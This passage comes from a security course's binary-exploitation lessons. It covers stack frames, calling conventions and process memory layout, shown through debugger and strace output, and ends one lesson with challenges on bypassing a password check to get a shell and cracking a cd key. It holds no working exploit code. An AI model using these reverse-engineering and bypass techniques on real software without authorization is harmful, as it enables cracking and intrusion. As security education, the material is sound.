License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law. Type &amp;#34;show copying&amp;#34;
and &amp;#34;show warranty&amp;#34; for details.
This GDB was configured as &amp;#34;i686-linux-gnu&amp;#34;.
For bug reporting instructions, please see:
&amp;lt;http://bugs.launchpad.net/gdb-linaro/&amp;gt;...
Reading symbols from /home/dgioga/sss/test...(no debugging symbols found)...done.
pwndbg&amp;gt; break main
Breakpoint 1 at 0x80483ba
pwndbg&amp;gt; run
[----------------------------------registers-----------------------------------]
EAX: 0x1
EBX: 0xb7fc6ff4 --&amp;gt; 0x1a0d7c
ECX: 0xbffff414 --&amp;gt; 0xbffff576 (&amp;#34;/home/dgioga/sss/test&amp;#34;)
EDX: 0xbffff3a4 --&amp;gt; 0xb7fc6ff4 --&amp;gt; 0x1a0d7c
ESI: 0x0
EDI: 0x0
EBP: 0xbffff378 --&amp;gt; 0x0
ESP: 0xbffff368 --&amp;gt; 0x80483d9 (&amp;lt;__libc_csu_init+9&amp;gt;:,add ebx,0x1c1b)
EIP: 0x80483ba (&amp;lt;main+6&amp;gt;:,mov DWORD PTR [ebp-0x4],0x1)
EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
0x80483b4 &amp;lt;main&amp;gt;:, push ebp
0x80483b5 &amp;lt;main+1&amp;gt;:,mov ebp,esp
0x80483b7 &amp;lt;main+3&amp;gt;:,sub esp,0x10
=&amp;gt; 0x80483ba &amp;lt;main+6&amp;gt;:,mov DWORD PTR [ebp-0x4],0x1
0x80483c1 &amp;lt;main+13&amp;gt;:,mov eax,0x0
0x80483c6 &amp;lt;main+18&amp;gt;:,leave
0x80483c7 &amp;lt;main+19&amp;gt;:,ret
0x80483c8:,nop
[------------------------------------stack-------------------------------------]
0000| 0xbffff368 --&amp;gt; 0x80483d9 (&amp;lt;__libc_csu_init+9&amp;gt;:,add ebx,0x1c1b)
0004| 0xbffff36c --&amp;gt; 0xb7fc6ff4 --&amp;gt; 0x1a0d7c
0008| 0xbffff370 --&amp;gt; 0x80483d0 (&amp;lt;__libc_csu_init&amp;gt;:,push ebp)
0012| 0xbffff374 --&amp;gt; 0x0
0016| 0xbffff378 --&amp;gt; 0x0
0020| 0xbffff37c --&amp;gt; 0xb7e3f4d3 (&amp;lt;__libc_start_main+243&amp;gt;:,mov DWORD PTR [esp],eax)
0024| 0xbffff380 --&amp;gt; 0x1
0028| 0xbffff384 --&amp;gt; 0xbffff414 --&amp;gt; 0xbffff576 (&amp;#34;/home/dgioga/sss/test&amp;#34;)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Breakpoint 1, 0x080483ba in main ()
&lt;/code>&lt;/pre>&lt;p>As you can see the operations that relate to the stack are:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>The old frame pointer is saved.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>EBP takes the value of ESP (the frame pointer is set to point to the current function's frame).&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>0x10&lt;/code> is subtracted from ESP (reserve space for local variables).&lt;/p>
&lt;/li>
&lt;li>
&lt;p>The value &lt;code>0x01&lt;/code> is placed at the address of EBP-0x4 (the local
variable &lt;code>a&lt;/code> takes the value 1).&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h4 id="function-parameters">Function parameters&lt;/h4>
&lt;p>The stack is also used to pass in parameters to functions.&lt;/p>
&lt;p>In the process of calling a function we can define two entities. The callee (the function that gets called) and the caller (the function that calls).&lt;/p>
&lt;p>When a function is called, the caller pushes the parameters for the callee on the stack. The parameters are pushed in reverse order.&lt;/p>
&lt;p>When the callee wants to get access to the parameters it was called with, all it needs to do is access the area of the stack that is higher up in reference to the start of it's frame.&lt;/p>
&lt;p>At this point it makes sense to remember the following cases:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>When EBP+value is referred to it is generally a referral to a parameter passed in to the current function.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>When EBP-value is referred to it is generally a referral to a local variable.&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>Lets see how this happens with the following code:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">#include &amp;lt;stdio.h&amp;gt;
int add(int a, int b)
{
int c;
c=a+b;
return c;
}
int main()
{
add(10,3);
return 0;
}
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">pwndbg&amp;gt; pdis 0x080483ca
Dump of assembler code for function main:
0x080483ca &amp;lt;+0&amp;gt;:,push ebp #save the old frame pointer
0x080483cb &amp;lt;+1&amp;gt;:,mov ebp,esp #create the new frame pointer
0x080483cd &amp;lt;+3&amp;gt;:,sub esp,0x8 #create space for local variables
0x080483d0 &amp;lt;+6&amp;gt;:,mov DWORD PTR [esp+0x4],0x3 #push the last parameter of the function that is to be called
0x080483d8 &amp;lt;+14&amp;gt;:,mov DWORD PTR [esp],0xa #push the second to last(the first in this case) parameter of the function that is to be called
0x080483df &amp;lt;+21&amp;gt;:,call 0x80483b4 &amp;lt;add&amp;gt; #call the function
0x080483e4 &amp;lt;+26&amp;gt;:,mov eax,0x0
0x080483e9 &amp;lt;+31&amp;gt;:,leave
0x080483ea &amp;lt;+32&amp;gt;:,ret
End of assembler dump.
pwndbg&amp;gt; pdis 0x080483b4
Dump of assembler code for function add:
0x080483b4 &amp;lt;+0&amp;gt;:,push ebp #save the old frame pointer
0x080483b5 &amp;lt;+1&amp;gt;:,mov ebp,esp #create a new frame pointer
0x080483b7 &amp;lt;+3&amp;gt;:,sub esp,0x10 #create space for local variables
0x080483ba &amp;lt;+6&amp;gt;:,mov eax,DWORD PTR [ebp+0xc] #move the first parameter into the EAX register (ebp+saved_ebp(4 bytes)+return_addres(4 bytes)+last_parameter(4 bytes))
0x080483bd &amp;lt;+9&amp;gt;:,mov edx,DWORD PTR [ebp+0x8] #move the second parameter into the EDX register (ebp+saved_ebp(4 bytes)+return_addres(4 bytes))
0x080483c0 &amp;lt;+12&amp;gt;:,add eax,edx #add the registers
0x080483c2 &amp;lt;+14&amp;gt;:,mov DWORD PTR [ebp-0x4],eax #place the result inside the local variable (c)
0x080483c5 &amp;lt;+17&amp;gt;:,mov eax,DWORD PTR [ebp-0x4] #place the result inside the eax register in order to return it
0x080483c8 &amp;lt;+20&amp;gt;:,leave
0x080483c9 &amp;lt;+21&amp;gt;:,ret
End of assembler dump.
&lt;/code>&lt;/pre>&lt;p>As you can see the parameters were pushed in reverse order, and the rule regarding the reference to EBP holds.&lt;/p>
&lt;p>If you don't understand why the offset for the parameters starts at EBP+0x08 and not EBP follow through with the next section.&lt;/p>
&lt;h4 id="calling-functions-call-and-ret">Calling functions (call and ret)&lt;/h4>
&lt;p>When calling a function the callee places the return address on the stack. This address is nothing more than a bookmark so that execution can resume where it left off once the called function finishes
execution.&lt;/p>
&lt;p>The last instruction in functions is usually a &lt;code>ret&lt;/code> instruction that resumes execution to the callee.&lt;/p>
&lt;p>For a better understanding of function calling and returning, from an execution flow point of view, please follow through with the following tip.&lt;/p>
&lt;p>&lt;span style="font-size:1rem; background:lightgrey;">The call instruction could be translated to the following instructions:&lt;/span>&lt;/p>
&lt;ol>
&lt;li>&lt;code>push eip&lt;/code>&lt;/li>
&lt;li>&lt;code>mov eip, address_of_called_function&lt;/code>&lt;/li>
&lt;/ol>
&lt;p>The ret instruction could be translated into:&lt;/p>
&lt;ol>
&lt;li>&lt;code>pop eip&lt;/code>&lt;/li>
&lt;/ol>
&lt;p>The visual depiction of how the stack looks while a program is executing
can be found in section 2 but will be included here as well:&lt;/p>
&lt;p align="center">
&lt;img src="https://security.cs.pub.ro/summer-school/wiki/_media/session/stack-convention.png?w=600&amp;tok=d710e1">
&lt;/p>
&lt;h3 id="next-lesson-preview-buffer-overflows">Next lesson preview: Buffer Overflows&lt;/h3>
&lt;p>Now that we have a complete overview of the stack we can step forward to stack based buffer overflows.&lt;/p>
&lt;p>A buffer overflow takes place when there is a lack of checking regarding boundaries and usually result in complete control of the program's instruction pointer. This takes place when a buffer overflows its boundaries and overwrites the return address of a function.&lt;/p>
&lt;p>A typical example of buffer overflows can be seen in the following picture:&lt;/p>
&lt;p align="center">
&lt;img src="https://security.cs.pub.ro/summer-school/wiki/_media/session/s5_buffer_overflow.jpg?w=500&amp;tok=810778">
&lt;/p>
&lt;h2 id="challenges">Challenges&lt;/h2>
&lt;p>Use GDB and pwndbg to run the code provided in the Activities section.&lt;/p>
&lt;h3 id="01-challenge---explore-the-simple-password-protected-bash">01. Challenge - Explore The Simple Password Protected Bash&lt;/h3>
&lt;p>The executable gets input from the user and evaluates it against a static condition. If it succeeds it then calls a &lt;code>password_accepted&lt;/code> function that prints out a success message and spawns a shell.&lt;/p>
&lt;p>Your task is to use GDB and pwndbg to force the executable to call the &lt;code>password_accepted&lt;/code> function.&lt;/p>
&lt;p>Gather as much info about the executable as possible through the techniques you have learned in previous sessions.&lt;/p>
&lt;p>Think of modifying registers for forcing the executable to call thefunction (there is more than one way of doing this).&lt;/p>
&lt;h3 id="02-challenge---simple-password-protected-bash-destruction">02. Challenge - Simple Password Protected Bash Destruction&lt;/h3>
&lt;p>What is the condition against which your input is evaluated in the executable contained in the executable &lt;code>sppb&lt;/code>?&lt;/p>
&lt;p>&lt;span style="font-size:1rem; background:lightgrey;">The ultimate goal is to be able to craft an input for the binary so that
the &lt;code>password_accepted&lt;/code> function is called (modifying registers while
running the program in GDB is just for training purposes).&lt;/span>&lt;/p>
&lt;h3 id="03-challenge---domino">03. Challenge - Domino&lt;/h3>
&lt;p>Analyze the binary, reverse engineer what it does and get a nice message
back.&lt;/p>
&lt;h3 id="04-challenge---call-me">04. Challenge - Call me&lt;/h3>
&lt;p>Investigate the binary in &lt;code>04-challenge-call-me/src/call_me&lt;/code> and find
out the flag&lt;/p>
&lt;details>
&lt;summary>Hint&lt;/summary>
There is something hidden you can toy around with.
&lt;/details>
&lt;details>
&lt;summary>Hint &lt;/summary>
The challenge name is a hint.
&lt;/details>
&lt;h3 id="05-challenge---snooze-me">05. Challenge - Snooze Me&lt;/h3>
&lt;p>I wrote a simple binary that computes the answer to life, the universe and everything. It swear it works&amp;hellip; eventually.&lt;/p>
&lt;h3 id="06-challenge---phone-home">06. Challenge - Phone Home&lt;/h3>
&lt;p>To protect their confidential data from those snooping cloud providers, the authors of &lt;code>06-challenge-phone-home/src/phone_home&lt;/code> have used some obfuscation techniques.&lt;/p>
&lt;p>Unfortunately, the key feature of the application is now unreachable due to a bug. Can you bypass the impossible condition?&lt;/p>
&lt;h3 id="07-challenge---chain-encoder">07. Challenge - Chain encoder&lt;/h3>
&lt;p>How do you reverse something made to be ireversible, you are welcome to find out in this challenge.&lt;/p>
&lt;h3 id="08-challenge---simple-cdkey">08. Challenge - Simple cdkey&lt;/h3>
&lt;p>I found this software but i don&amp;rsquo;t have the cd key, can you crack it for me?&lt;/p>
&lt;hr>
&lt;p>Except where otherwise noted, content on this wiki is licensed under the
following license: &lt;a href="https://creativecommons.org/licenses/by-sa/4.0/deed.en">CC Attribution-Share Alike 4.0 International&lt;/a>&lt;/p></description></item><item><title>Binary:</title><link>/binary/executables-and-processes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/binary/executables-and-processes/</guid><description>
&lt;h1 id="executables-and-processes">Executables and Processes&lt;/h1>
&lt;p>From a user&amp;rsquo;s perspective, the main purpose of the computing system is to run applications.
Applications are used for the user&amp;rsquo;s benefit: listen to music, organize files, play games, develop applications, chat over the Internet, etc.&lt;/p>
&lt;p>A running application is called &lt;strong>a process&lt;/strong>.
A user starts a process, interacts with a process, ends a process.&lt;/p>
&lt;p>When a process runs for the benefit of the user, it &lt;strong>executes instructions&lt;/strong> that &lt;strong>operate on data&lt;/strong>.
These two items (executing instructions and operating on data) are the most relevant items to understanding processes and executables.
Instructions, also called &lt;strong>code&lt;/strong>, and &lt;strong>data&lt;/strong> reside in memory.
Code is read from memory by the processor / CPU (&lt;em>Central Processing Unit&lt;/em>), then it is decoded and interpreted by the CPU, then it is executed on data that is also read from memory by the CPU.
Finally, the result of the operation is stored back into memory.
So, each process has its memory space that stores code and data.&lt;/p>
&lt;p>TODO: diagram with memory (code, data) and CPU interaction&lt;/p>
&lt;p>We say that each process has its own memory space, also called address space.
We refer to this as &lt;strong>process address space&lt;/strong>, or &lt;strong>process virtual address space&lt;/strong> ((P)VAS) (why this is named &lt;em>virtual&lt;/em> is outside the scope of this section).
This space is populated with data and code.
Data is dynamic with respect to contents and size: it can be modified, it can be enlarged or shrinked.
Code is static: it can&amp;rsquo;t be (easily) modified, it can&amp;rsquo;t be (easily) enlarged.
Data can be read from or written to outside the process memory, to outside devices (I/O - &lt;em>Input/Output&lt;/em>) - keyboard, monitor, network, disk.
Code is however read at process birth time.&lt;/p>
&lt;p>The origin of the code and some parts of the data is &lt;strong>the application executable&lt;/strong> (or program executable).
The application executable is a binary file with a given format that stores the code and initial data that will be used to set up the process.
The birth of a process means loading the code and initial data from the program executable into memory.
This creates the process virtual address space.
Then the CPU is pointed to execute instructions from the new process virtual address spaces and now the process is running.&lt;/p>
&lt;p>TODO: diagram with executable (code, data) and process memory (code, data) + CPU (code + data interaction) + I/O (for parts of data)&lt;/p>
&lt;p>We call the starting of a process from a program executable &lt;strong>loading&lt;/strong>.
The &lt;strong>loader&lt;/strong> is the piece of software responsible for this.
Whatever happens during loading is said to happen during &lt;strong>load-time&lt;/strong>.
After the process starts, whatever happens is said to happen at / during &lt;strong>runtime&lt;/strong>.&lt;/p>
&lt;p>For this session we will first look at the process virtual address space and see how it is updated at runtime.
We will then map that information to the program executable and what&amp;rsquo;s hapenning at load-time.
We will then spend more time dissecting and executable and make the first steps on static analysis, the subject of the &lt;a href="https://github.com/razvand/binary/tree/master/sessions/static-analysis">next section&lt;/a>.&lt;/p>
&lt;h2 id="process-memory-layout">Process Memory Layout&lt;/h2>
&lt;p>To understand the full picture of program execution it is vital to understand the memory layout of processes from ELF executables.
The kernel provides an interface in &lt;code>/proc/&amp;lt;PID&amp;gt;/maps&lt;/code> for each process to see how the memory layout looks like.&lt;/p>
&lt;p>Let&amp;rsquo;s write a simple Hello World application and investigate.&lt;/p>
&lt;p>&lt;strong>IMPORTANT:&lt;/strong> Note that we have removed &lt;strong>Address Space Layout Randomization&lt;/strong> for these examples.
We&amp;rsquo;ll explain this later.&lt;/p>
&lt;pre tabindex="0">&lt;code>#include &amp;lt;stdio.h&amp;gt;
int main()
{
printf(&amp;#34;Hello world\n&amp;#34;);
malloc(10000);
while(1){
;
}
return 0;
}
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>$ gcc -Wall hw.c -o hw -m32
$ ./hw &amp;amp;
[1] 4771
Hello world
$ cat /proc/4771/maps
08048000-08049000 r-xp 00000000 08:06 1843771 /tmp/hw
08049000-0804a000 r--p 00000000 08:06 1843771 /tmp/hw
0804a000-0804b000 rw-p 00001000 08:06 1843771 /tmp/hw
0804b000-0806e000 rw-p 00000000 00:00 0 [heap]
f7ded000-f7dee000 rw-p 00000000 00:00 0
f7dee000-f7f93000 r-xp 00000000 08:06 917808 /lib32/libc-2.17.so
f7f93000-f7f95000 r--p 001a5000 08:06 917808 /lib32/libc-2.17.so
f7f95000-f7f96000 rw-p 001a7000 08:06 917808 /lib32/libc-2.17.so
f7f96000-f7f99000 rw-p 00000000 00:00 0
f7fd9000-f7fdb000 rw-p 00000000 00:00 0
f7fdb000-f7fdc000 r-xp 00000000 00:00 0 [vdso]
f7fdc000-f7ffc000 r-xp 00000000 08:06 917869 /lib32/ld-2.17.so
f7ffc000-f7ffd000 r--p 0001f000 08:06 917869 /lib32/ld-2.17.so
f7ffd000-f7ffe000 rw-p 00020000 08:06 917869 /lib32/ld-2.17.so
fffdd000-ffffe000 rw-p 00000000 00:00 0 [stack]
&lt;/code>&lt;/pre>&lt;p>If we start another process in the background the output for it will be exactly the same as this one.
Why is that? The answer, of course, is virtual memory.
The kernel provides this mechanism through which each process has an address space &lt;strong>completely isolated&lt;/strong> from that of other running processes.
They can still communicate using inter-process communication mechanisms provided by the kernel but we won&amp;rsquo;t get into that here.
Shortly put, there would be two processes with the same name and with two &lt;strong>apparently&lt;/strong> identical mappings, but still the two programs would be isolated from one another.&lt;/p>
&lt;p>An initial schematic of the memory layout would be the following:&lt;/p>
&lt;p>&lt;img src="assets/elf-space.png" alt="ELF Memory Layout">&lt;/p>
&lt;h3 id="executable">Executable&lt;/h3>
&lt;p>As we have seen, there are three memory regions associated with the executable:&lt;/p>
&lt;pre tabindex="0">&lt;code>08048000-08049000 r-xp 00000000 08:06 1843771 /tmp/hw
08049000-0804a000 r--p 00000000 08:06 1843771 /tmp/hw
0804a000-0804b000 rw-p 00001000 08:06 1843771 /tmp/hw
&lt;/code>&lt;/pre>&lt;p>From their permissions we can infer what they correspond to:&lt;/p>
&lt;ul>
&lt;li>&lt;code>08048000-08049000 r-xp&lt;/code> is the &lt;code>.text&lt;/code> section along with the rest of the executable parts&lt;/li>
&lt;li>&lt;code>08049000-0804a000 r–p&lt;/code> is the &lt;code>.rodata&lt;/code> section&lt;/li>
&lt;li>&lt;code>0804a000-0804b000 rw-p&lt;/code> consists of the &lt;code>.data&lt;/code>, &lt;code>.bss&lt;/code> sections and other R/W sections&lt;/li>
&lt;/ul>
&lt;p>It is interesting to note that the executable is almost identically mapped into memory.
The only region that is &lt;em>compressed&lt;/em> in the binary is the &lt;code>.bss&lt;/code> section.
Let&amp;rsquo;s see this in action by dumping the header of the file:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ hexdump -Cv hw | head
00000000 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 |.ELF............|
00000010 02 00 03 00 01 00 00 00 b0 83 04 08 34 00 00 00 |............4...|
00000020 78 11 00 00 00 00 00 00 34 00 20 00 0a 00 28 00 |x.......4. ...(.|
00000030 1e 00 1b 00 06 00 00 00 34 00 00 00 34 80 04 08 |........4...4...|
00000040 34 80 04 08 40 01 00 00 40 01 00 00 05 00 00 00 |4...@...@.......|
00000050 04 00 00 00 03 00 00 00 74 01 00 00 74 81 04 08 |........t...t...|
00000060 74 81 04 08 13 00 00 00 13 00 00 00 04 00 00 00 |t...............|
00000070 01 00 00 00 01 00 00 00 00 00 00 00 00 80 04 08 |................|
00000080 00 80 04 08 6c 06 00 00 6c 06 00 00 05 00 00 00 |....l...l.......|
00000090 00 10 00 00 01 00 00 00 00 0f 00 00 00 9f 04 08 |................|
$ gdb ./hw
...........
gdb-peda$ hexdump 0x08048000 /10
0x08048000 : 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 .ELF............
0x08048010 : 02 00 03 00 01 00 00 00 b0 83 04 08 34 00 00 00 ............4...
0x08048020 : 78 11 00 00 00 00 00 00 34 00 20 00 0a 00 28 00 x.......4. ...(.
0x08048030 : 1e 00 1b 00 06 00 00 00 34 00 00 00 34 80 04 08 ........4...4...
0x08048040 : 34 80 04 08 40 01 00 00 40 01 00 00 05 00 00 00 4...@...@.......
0x08048050 : 04 00 00 00 03 00 00 00 74 01 00 00 74 81 04 08 ........t...t...
0x08048060 : 74 81 04 08 13 00 00 00 13 00 00 00 04 00 00 00 t...............
0x08048070 : 01 00 00 00 01 00 00 00 00 00 00 00 00 80 04 08 ................
0x08048080 : 00 80 04 08 6c 06 00 00 6c 06 00 00 05 00 00 00 ....l...l.......
0x08048090 : 00 10 00 00 01 00 00 00 00 0f 00 00 00 9f 04 08 ................
&lt;/code>&lt;/pre>&lt;h3 id="heap">Heap&lt;/h3>
&lt;p>The heap comes right after the executable at &lt;code>0x0804b000&lt;/code> and ends at &lt;code>0x0806e000&lt;/code> which is the current &lt;code>brk&lt;/code> point.
The memory allocator will increase the &lt;code>brk&lt;/code> when more allocations are made but will not decrease it when memory is freed so as to reuse the memory regions for future allocations.
The allocator in libc actually keeps a list of past allocations and their sizes.
When future allocations will require the same size as a previously freed region, the allocator will reuse one from this lookup table.
The process is called &lt;strong>binning&lt;/strong>.&lt;/p>
&lt;p>Let&amp;rsquo;s see how the brk evolves in our executable using strace:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ strace -i -e brk ./hw
[ Process PID=1995 runs in 32 bit mode. ]
[f7ff2314] brk(0) = 0x804b000
Hello world
[f7fdb430] brk(0) = 0x804b000
[f7fdb430] brk(0x806e000) = 0x806e000
&lt;/code>&lt;/pre>&lt;p>Let&amp;rsquo;s test the fact that the &lt;code>brk&lt;/code> does not decrease and that future malloc&amp;rsquo;s can reuse previously freed regions:&lt;/p>
&lt;pre tabindex="0">&lt;code>#include &amp;lt;stdio.h&amp;gt;
int main()
{
void * buf[15];
int i;
for( i = 0 ; i &amp;lt; 15; i++)
buf[i] = malloc( i * 100) ;
for( i = 0 ; i &amp;lt; 15; i++)
free( buf[i] );
for( i = 0 ; i &amp;lt; 15; i++)
buf[i] = malloc( i * 100) ;
return 0;
}
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>$ strace -e brk ./hw
[ Process PID=2424 runs in 32 bit mode. ]
brk(0) = 0x804b000
brk(0) = 0x804b000
brk(0x806c000) = 0x806c000
+++ exited with 0 +++
$ ltrace -e malloc ./hw
hw-&amp;gt;malloc(0) = 0x804b008
hw-&amp;gt;malloc(100) = 0x804b018
hw-&amp;gt;malloc(200) = 0x804b080
hw-&amp;gt;malloc(300) = 0x804b150
hw-&amp;gt;malloc(400) = 0x804b280
hw-&amp;gt;malloc(500) = 0x804b418
hw-&amp;gt;malloc(600) = 0x804b610
hw-&amp;gt;malloc(700) = 0x804b870
hw-&amp;gt;malloc(800) = 0x804bb30
hw-&amp;gt;malloc(900) = 0x804be58
hw-&amp;gt;malloc(1000) = 0x804c1e0
hw-&amp;gt;malloc(1100) = 0x804c5d0
hw-&amp;gt;malloc(1200) = 0x804ca20
hw-&amp;gt;malloc(1300) = 0x804ced8
hw-&amp;gt;malloc(1400) = 0x804d3f0
hw-&amp;gt;malloc(0) = 0x804b008
hw-&amp;gt;malloc(100) = 0x804b018
hw-&amp;gt;malloc(200) = 0x804b080
hw-&amp;gt;malloc(300) = 0x804b150
hw-&amp;gt;malloc(400) = 0x804b280
hw-&amp;gt;malloc(500) = 0x804b418
hw-&amp;gt;malloc(600) = 0x804b610
hw-&amp;gt;malloc(700) = 0x804b870
hw-&amp;gt;malloc(800) = 0x804bb30
hw-&amp;gt;malloc(900) = 0x804be58
hw-&amp;gt;malloc(1000) = 0x804c1e0
hw-&amp;gt;malloc(1100) = 0x804c5d0
hw-&amp;gt;malloc(1200) = 0x804ca20
hw-&amp;gt;malloc(1300) = 0x804ced8
hw-&amp;gt;malloc(1400) = 0x804d3f0
+++ exited (status 0) +++
&lt;/code>&lt;/pre>&lt;p>As you can see, only one &lt;code>brk&lt;/code> call is made.
Furthermore, after the regions are freed they are reused.&lt;/p>
&lt;p>&lt;strong>IMPORTANT:&lt;/strong> This behaviour of the allocator is important in the &lt;strong>Use After Free&lt;/strong> class of vulnerabilities which we will be covering in the next labs.&lt;/p>
&lt;h3 id="memory-mappings-and-libraries">Memory Mappings and Libraries&lt;/h3>
&lt;p>In our example we had the following memory mappings:&lt;/p>
&lt;pre tabindex="0">&lt;code>f7ded000-f7dee000 rw-p 00000000 00:00 0
f7dee000-f7f93000 r-xp 00000000 08:06 917808 /lib32/libc-2.17.so
f7f93000-f7f95000 r--p 001a5000 08:06 917808 /lib32/libc-2.17.so
f7f95000-f7f96000 rw-p 001a7000 08:06 917808 /lib32/libc-2.17.so
f7f96000-f7f99000 rw-p 00000000 00:00 0
f7fd9000-f7fdb000 rw-p 00000000 00:00 0
f7fdb000-f7fdc000 r-xp 00000000 00:00 0 [vdso]
f7fdc000-f7ffc000 r-xp 00000000 08:06 917869 /lib32/ld-2.17.so
f7ffc000-f7ffd000 r--p 0001f000 08:06 917869 /lib32/ld-2.17.so
f7ffd000-f7ffe000 rw-p 00020000 08:06 917869 /lib32/ld-2.17.so
&lt;/code>&lt;/pre>&lt;p>All functions that are called from external libraries &lt;em>pull&lt;/em> in the whole library into the address space.
As these are also ELF files you can see that they have similar patterns: multiple sections with different permissions just like the main executable.&lt;/p>
&lt;p>One more thing to note here is that large calls to &lt;code>malloc&lt;/code> result in calls to &lt;code>mmap2&lt;/code>:&lt;/p>
&lt;pre tabindex="0">&lt;code>#include &amp;lt;stdio.h&amp;gt;
int main()
{
printf(&amp;#34;Hello world\n&amp;#34;);
printf(&amp;#34;Small allocation %p\n&amp;#34;, malloc(10000));
printf(&amp;#34;Big allocation %p\n&amp;#34;, malloc(10000000));
return 0;
}
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code># strace -e brk,mmap2 ./hw_large
[ Process PID=3445 runs in 32 bit mode. ]
brk(0) = 0x804b000
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7fda000
mmap2(NULL, 265183, PROT_READ, MAP_PRIVATE, 3, 0) = 0xfffffffff7f99000
mmap2(NULL, 1747628, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xfffffffff7dee000
mmap2(0xf7f93000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1a5000) = 0xfffffffff7f93000
mmap2(0xf7f96000, 10924, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7f96000
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7ded000
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7fd9000
Hello world
brk(0) = 0x804b000
brk(0x806e000) = 0x806e000
Small allocation 0x804b008
mmap2(NULL, 10002432, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7463000
Big allocation 0xf7463008
&lt;/code>&lt;/pre>&lt;p>As expected, the &lt;code>brk&lt;/code> is increased when the first allocation is made.
However, larger regions are backed by memory mappings.&lt;/p>
&lt;h3 id="stack">Stack&lt;/h3>
&lt;p>If you observed from previous traces, the &lt;code>mmap2&lt;/code> call returns addresses towards NULL (lower addresses).
It behaves like this because there is another important memory region called the &lt;code>stack&lt;/code> that has a fixed size: usually 8 MB.
Since the heap and the mmap region do not have this limit imposed the optimization is to start mmap-ings from a known boundary: the stack end boundary.
Let&amp;rsquo;s put this into perspective.
You can view the current stack limit using &lt;code>ulimit -s&lt;/code>.&lt;/p>
&lt;pre tabindex="0">&lt;code>$ ulimit -s
8192
$ python
&amp;gt;&amp;gt;&amp;gt; hex(0xffffffff - 8192*1024)
&amp;#39;0xff7fffff&amp;#39;
&lt;/code>&lt;/pre>&lt;p>This address is the stack boundary.
It seems odd then that the first mmap in the program above ends at &lt;code>0xf7ffe000&lt;/code> and not &lt;code>0xff7fffff&lt;/code>.
This is probably an optimization.&lt;/p>
&lt;p>However, we can set the stack size to unlimited and the mmap allocation direction will reverse:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ ulimit -s unlimited
$ strace -e mmap2,brk ./hw_large
[ Process PID=4617 runs in 32 bit mode. ]
brk(0) = 0x804b000
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x55578000
mmap2(NULL, 265183, PROT_READ, MAP_PRIVATE, 3, 0) = 0x55579000
mmap2(NULL, 1747628, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x555ba000
mmap2(0x5575f000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1a5000) = 0x5575f000
mmap2(0x55762000, 10924, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x55762000
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x55765000
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x55579000
Hello world
brk(0) = 0x804b000
brk(0x806e000) = 0x806e000
Small allocation 0x804b008
mmap2(NULL, 10002432, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x55766000
Big allocation 0x55766008
^Z
[1]+ Stopped strace -e mmap2,brk ./hw_large
$ cat /proc/4617/maps
08048000-08049000 r-xp 00000000 08:06 1843771 /tmp/hw_large
08049000-0804a000 r--p 00000000 08:06 1843771 /tmp/hw_large
0804a000-0804b000 rw-p 00001000 08:06 1843771 /tmp/hw_large
0804b000-0806e000 rw-p 00000000 00:00 0 [heap]
55555000-55575000 r-xp 00000000 08:06 917869 /lib32/ld-2.17.so
55575000-55576000 r--p 0001f000 08:06 917869 /lib32/ld-2.17.so
55576000-55577000 rw-p 00020000 08:06 917869 /lib32/ld-2.17.so
55577000-55578000 r-xp 00000000 00:00 0 [vdso]
55578000-5557a000 rw-p 00000000 00:00 0
555ba000-5575f000 r-xp 00000000 08:06 917808 /lib32/libc-2.17.so
5575f000-55761000 r--p 001a5000 08:06 917808 /lib32/libc-2.17.so
55761000-55762000 rw-p 001a7000 08:06 917808 /lib32/libc-2.17.so
55762000-560f0000 rw-p 00000000 00:00 0
